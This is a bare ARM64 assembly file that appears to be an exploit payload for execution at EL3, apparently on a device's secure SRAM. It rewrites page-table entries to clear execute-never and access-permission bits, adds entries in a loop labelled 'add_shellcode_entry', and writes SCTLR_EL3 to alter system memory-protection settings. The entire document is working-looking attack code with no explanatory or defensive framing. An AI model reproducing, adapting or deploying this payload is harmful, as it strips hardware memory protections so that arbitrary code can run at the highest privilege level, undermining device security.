.text

.align 2

.globl _main
_main:
  orr        x2, xzr, #0x180000000
  add        x2, x2, #0x50, lsl #12
  ldr        x1, [x2, #0x600]
  and        x2, x1, #0x1ffffc000
  mov        x3, #0x0
  mov        x4, #0x3ff8

patch:
  ldr        x1, [x2, x3]
  and        x1, x1, #0xffbfffffffffffff
  and        x1, x1, #0xffdfffffffffffff
  and        x1, x1, #0xffffffffffffff3f
  str        x1, [x2, x3]
  dmb        sy
  add        x3, x3, #0x8
  cmp        x3, x4
  b.lt       patch

  mov        x0, #0x0

add_shellcode_entry:
  orr        x1, xzr, #0x180000000
  add        x1, x1, #0x627
  lsl        x3, x0, #0xe
  add        x1, x1, x3
  lsl        x3, x0, #0x3
  str        x1, [x2, x3]
  add        x0, x0, #0x1
  cmp        x0, #0x20
  b.lt       add_shellcode_entry

  mov        x0, #0x100d
  msr        sctlr_el3, x0
  dsb        sy
  isb
  ret
